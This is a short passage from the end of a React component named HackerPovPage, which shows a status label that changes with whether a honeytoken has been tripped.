            <span className="backchannel-val" style={{ color: honeytokenTripped ? '#34d399' : '#64748b' }}>
              {honeytokenTripped ? 'CASE-2026-001 Quorum Open' : 'Blocked (Safeguard Active)'}
            </span>
          </div>
        </div>
      </div>
    </div>
  )
}

export default HackerPovPage
